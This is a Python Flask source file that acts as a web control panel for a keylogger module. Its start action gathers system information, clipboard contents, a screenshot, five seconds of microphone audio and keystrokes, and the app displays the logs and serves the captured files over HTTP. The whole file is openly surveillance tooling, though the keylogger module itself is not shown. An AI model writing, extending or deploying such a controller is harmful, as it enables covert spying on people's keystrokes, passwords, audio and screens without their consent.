from flask import Flask, render_template, request
from flask import send_from_directory
import keylogger
import os

app = Flask(__name__)

session_path = keylogger.file_path


@app.route('/files/<filename>')
def files(filename):
    return send_from_directory(keylogger.file_path, filename)


@app.route('/', methods=['GET', 'POST'])
def index():
    output = ''
    logs = ''
    if request.method == 'POST':
        action = request.form.get('action')
        if action == 'start':
            keylogger.computer_information()
            keylogger.copy_clipboard()
            keylogger.screenshot()
            keylogger.microphone(5)
            keylogger.start_keylogger()
            output = 'Keylogger started.'
        elif action == 'stop':
            keylogger.stop_keylogger()
            output = 'Keylogger stopped.'
        logs = keylogger.read_logs()  # Only fetch logs after an action
    else:
         # Clear logs only, not all files
        open(os.path.join(session_path, keylogger.keys_information), 'w').close()
    return render_template('index.html', output=output, logs=logs)

if __name__ == '__main__':
    app.run(debug=True)
